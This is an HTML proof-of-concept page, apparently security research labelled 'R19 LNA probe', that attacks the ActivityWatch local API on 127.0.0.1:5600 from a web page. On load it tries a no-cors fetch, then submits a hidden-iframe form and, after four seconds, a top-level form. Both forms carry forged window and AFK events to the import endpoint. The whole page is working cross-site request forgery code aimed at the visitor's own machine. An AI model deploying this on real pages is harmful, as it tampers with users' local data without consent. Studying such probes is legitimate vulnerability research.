<!DOCTYPE html><html><head><meta charset="utf-8"><title>R19 LNA probe</title></head><body>
<h3>R19 ActivityWatch local-API reachability probe</h3>
<pre id="log"></pre>
<iframe name="sink" style="display:none"></iframe>
<form id="f1" method="POST" action="http://127.0.0.1:5600/api/0/import" target="sink" enctype="multipart/form-data">
  <input type="file" name="buckets"><input type="submit" value="iframe-import">
</form>
<form id="f2" method="POST" action="http://127.0.0.1:5600/api/0/import" enctype="multipart/form-data">
  <input type="file" name="buckets"><input type="submit" value="top-import">
</form>
<script>
const L=(m)=>{document.getElementById('log').textContent+=m+"\n"};
function mkfile(host){
  const now=new Date().toISOString();
  const win="aw-watcher-window_"+host, afk="aw-watcher-afk_"+host;
  const payload={buckets:{}};
  payload.buckets[win]={"id":win,"type":"currentwindow","client":"aw-watcher-window","hostname":host,"created":now,"data":{},"events":[{"timestamp":now,"duration":1800,"data":{"app":"R19-LNA-PROBE","title":"iframe/form transport"}}]};
  payload.buckets[afk]={"id":afk,"type":"afkstatus","client":"aw-watcher-afk","hostname":host,"created":now,"data":{},"events":[{"timestamp":now,"duration":1800,"data":{"status":"not-afk"}}]};
  return new File([JSON.stringify(payload)],"buckets.json",{type:"application/json"});
}
(async()=>{
  // Probe A: no-cors fetch (known: blocked on chromium-current)
  try{
    const fd=new FormData(); fd.append("buckets",new Blob([JSON.stringify({buckets:{}})],{type:"application/json"}));
    const r=await fetch("http://127.0.0.1:5600/api/0/import",{method:"POST",mode:"no-cors",body:fd});
    L("A fetch: resolved status="+r.status);
  }catch(e){L("A fetch: REJECTED: "+e)}
  // Probe B: hidden iframe form POST navigation (frame)
  try{
    document.querySelector('#f1 input[type=file]').files = await new DataTransfer().items.add ? null : null;
  }catch(e){}
  try{
    const dt=new DataTransfer(); dt.items.add(mkfile("lnaframe"));
    document.querySelector('#f1 input[type=file]').files=dt.files;
    document.getElementById('f1').submit();
    L("B iframe-form: submitted (no exception)");
  }catch(e){L("B iframe-form: "+e)}
  // Probe C: top-level form POST navigation, auto after 4s
  const dt2=new DataTransfer(); dt2.items.add(mkfile("lnatopnav"));
  document.querySelector('#f2 input[type=file]').files=dt2.files;
  setTimeout(()=>{document.getElementById('f2').submit();},4000);
  L("C top-form: armed (4s)");
  L("DONE origin="+location.origin);
})();
</script></body></html>
